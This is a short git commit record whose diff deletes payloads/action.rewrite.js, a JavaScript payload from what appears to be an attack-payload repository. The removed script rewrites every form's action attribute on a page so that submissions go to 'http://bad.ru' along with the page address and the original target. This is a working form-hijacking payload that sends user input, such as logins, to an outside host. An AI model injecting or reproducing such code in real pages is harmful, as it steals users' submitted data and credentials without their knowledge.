ecf982e04142a3ab6454479e17e22d970c212cab
vxhex <tabete@gmail.com>
2014-02-14 11:33:16 -0600

    Moving payloads to dedicated repo

--- payloads/action.rewrite.js
+++
@@ -1,9 +0,0 @@
-(function() {
-  var collectionUrl = "http://bad.ru?u=";
-  document.body.innerHTML = document.body.innerHTML.replace(
-    /action="(.*?)"/gi,
-    function(a, b) {
-      var encoded = encodeURIComponent(window.location.href + b);
-      return "action='" + collectionUrl + encoded + "'";
-    });
-})();
